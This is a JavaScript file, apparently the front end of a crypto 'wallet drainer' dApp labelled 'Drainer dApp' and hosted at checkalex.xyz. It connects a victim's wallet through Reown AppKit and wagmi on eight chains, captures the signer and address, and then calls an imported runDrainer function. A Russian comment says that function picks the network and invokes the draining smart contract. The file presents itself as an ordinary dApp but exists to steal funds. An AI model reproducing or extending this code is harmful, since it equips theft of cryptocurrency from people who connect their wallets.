// main.js
import { createAppKit } from '@reown/appkit'
import {
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]

const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Drainer dApp',
    url: 'https://checkalex.xyz/',
    icons: [`https://checkalex.xyz/icon.png`],
  },
  features: { analytics: true }
})

// Сохраняем signer и provider после подключения
let signer = null
let provider = null
let userAddress = null

modal.on('connect', async (ctx) => {
  provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
  signer = provider.getSigner()
  userAddress = await signer.getAddress()

  // Активировать кнопку
  document.getElementById('drainer-btn').removeAttribute('disabled')

  document.getElementById('status').innerText = `✅ Подключено: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`
})

document
  .getElementById('open-connect-modal')
  .addEventListener('click', () => modal.open())

document
  .getElementById('drainer-btn')
  .addEventListener('click', async () => {
    if (!signer || !provider || !userAddress) {
      alert("Сначала подключите кошелёк.")
      return
    }

    try {
      // Эта функция уже всё делает — определяет нужную сеть и вызывает смарт-контракт
      await runDrainer(provider, signer, userAddress)
    } catch (e) {
      console.error("Ошибка при запуске drainer:", e)
      alert("Ошибка при выполнении транзакции: " + e.message)
    }
  })
